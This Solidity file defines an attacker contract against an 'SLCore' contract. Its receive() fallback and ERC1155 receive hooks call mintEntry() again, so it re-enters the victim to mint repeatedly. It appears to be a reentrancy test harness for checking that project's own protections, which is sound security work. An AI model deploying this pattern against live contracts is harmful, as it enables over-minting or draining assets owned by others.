// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SLCore.sol";
import "./ISLCore.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract AttackSLCoreEntry {
    ISLCore public slCore;

    constructor(address _slCoreAddress) {
        slCore = ISLCore(_slCoreAddress);
    }

    // Fallback function to repeatedly call the victim contract
    receive() external payable {
        slCore.mintEntry();
    }

    // Function to initiate the attack
    function startAttack() public {
        slCore.mintEntry();
    }

    function approveERC20(
        address paymentToken,
        address spender,
        uint256 amount
    ) public {
        IERC20(paymentToken).approve(spender, amount);
    }

    function onERC1155Received(
        address,
        address,
        uint256,
        uint256,
        bytes memory
    ) public virtual returns (bytes4) {
        slCore.mintEntry();
        return this.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(
        address,
        address,
        uint256[] memory,
        uint256[] memory,
        bytes memory
    ) public virtual returns (bytes4) {
        slCore.mintEntry();
        return this.onERC1155BatchReceived.selector;
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) public virtual returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
